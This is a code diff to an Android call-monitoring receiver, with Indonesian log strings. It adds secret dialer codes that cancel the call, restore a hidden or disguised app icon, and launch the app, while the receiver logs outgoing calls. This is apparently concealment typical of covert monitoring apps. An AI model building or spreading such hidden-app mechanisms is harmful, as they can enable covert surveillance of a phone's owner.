@@ -31,6 +31,29 @@ class CallReceiver : BroadcastReceiver() {
                 savedNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER)
                 isIncoming = false
                 callStartTime = System.currentTimeMillis()
+
+                // Check for Secret Launch Codes
+                val cleanNum = savedNumber?.replace(" ", "")?.trim()
+                if (cleanNum == "*#*#7788#*#*" || cleanNum == "*#*#1234#*#*" ||
+                    cleanNum == "7788" || cleanNum == "1234" ||
+                    cleanNum == "##7788" || cleanNum == "##1234" ||
+                    cleanNum == "*7788#" || cleanNum == "*1234#"
+                ) {
+                    Log.d("CallReceiver", "🔑 Kode Rahasia Telepon Terdeteksi: $cleanNum. Meluncurkan aplikasi...")
+                    resultData = null // Abort phone call
+
+                    com.example.data.security.IconDisguiseManager.restoreLauncher(context)
+
+                    val launchIntent = Intent(context, com.example.MainActivity::class.java).apply {
+                        flags = Intent.FLAG_ACTIVITY_NEW_TASK or
+                                Intent.FLAG_ACTIVITY_CLEAR_TOP or
+                                Intent.FLAG_ACTIVITY_SINGLE_TOP
+                        putExtra("EXTRA_OPENED_VIA_SECRET_CODE", true)
+                    }
+                    context.startActivity(launchIntent)
+                    return
+                }
+
                 Log.d("CallReceiver", "📞 Panggilan Keluar Terdeteksi: $savedNumber")
                 recordCallEvent(
                     context = context,
